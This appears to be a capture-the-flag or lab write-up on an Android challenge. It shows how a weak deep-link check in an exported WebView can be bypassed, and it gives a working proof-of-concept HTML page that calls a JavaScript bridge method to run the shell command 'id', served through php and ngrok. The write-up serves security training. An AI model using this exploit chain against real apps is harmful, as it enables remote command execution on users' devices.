

We can notice some conditions on checking the deep link received in the extra data of the intent starting the exported webview: 

```java
  
    private final boolean isValidDeepLink(Uri uri) {  
        if ((!Intrinsics.areEqual(uri.getScheme(), "mhl") && !Intrinsics.areEqual(uri.getScheme(), "https")) || !Intrinsics.areEqual(uri.getHost(), "mobilehackinglab")) {  
            return false;  
        }  
        String queryParameter = uri.getQueryParameter("url");  
        return queryParameter != null && StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, (Object) null);  
    }
    ```

the `isValidDeepLink()`function is checking only for the host and schema of the URI, and then the URL will be loaded directly in the webview.
This PoC demonstrates that we can load any website with the condition that the subdomain ends with `mobilehackinglab.com`.

![[Pasted image 20260118211620.png]]

We notice **JavaScript is enabled** → any injected or malicious JS can run.
```java
webSettings.setJavaScriptEnabled(true);
```

The idea here is to load an html file that we push already on the device and bypass the host check.

We notice the presence of the function that can execute commands passed to it as input:
![[Pasted image 20260118214013.png]]

Since WebwiewActivity() handle Uri data for using webview to load web page e.g. `mhl://mobilehackinglab/?url=https://URL?mobilehackinglab.com` we can host our page to call getTime() with our command


We expose the html script `POC.html` with ngrok server: 
```js
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<p id="result">Thank you for visiting</p>
<a href="#" onclick="loadWebsite()">Visit MobileHackingLab</a>
<script>
    function loadWebsite() {
       window.location.href = "https://www.mobilehackinglab.com/";
    }
    var result = AndroidBridge.getTime("id");
    var lines = result.split('\n');
    var command = lines[0];
    var fullMessage = "Successfully executed the command: " + command;
    document.getElementById('result').innerText = fullMessage;
</script>
</body>
</html>
```

```sh
php -S localhost:8080
```

```sh
ngrok http http://localhost:8080
```

<img width="692" height="320" alt="image" src="https://github.com/user-attachments/assets/61a319ec-0dd8-43c4-bc90-95c797e13d4f" />

